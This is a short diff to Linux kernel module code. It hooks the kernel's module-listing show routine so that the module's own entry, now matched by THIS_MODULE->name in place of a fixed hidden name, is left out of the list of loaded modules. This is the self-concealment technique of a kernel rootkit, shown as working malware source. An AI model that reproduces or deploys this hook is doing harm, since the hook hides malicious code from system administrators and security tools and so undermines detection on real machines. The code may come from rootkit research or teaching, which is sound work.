@@ -5,7 +5,7 @@ asmlinkage int (*org_m_show) (struct seq_file *m, void *p);
 // with the original show call
 static asmlinkage int hook_m_show(struct seq_file *m, void *p){
     struct module *mod = list_entry(p, struct module, list);
-    if (strcmp(mod->name, HIDDEN_MOD_NAME) == 0){
+    if (strcmp(mod->name, THIS_MODULE->name) == 0){
         return 0;
     }
     return org_m_show(m, p);
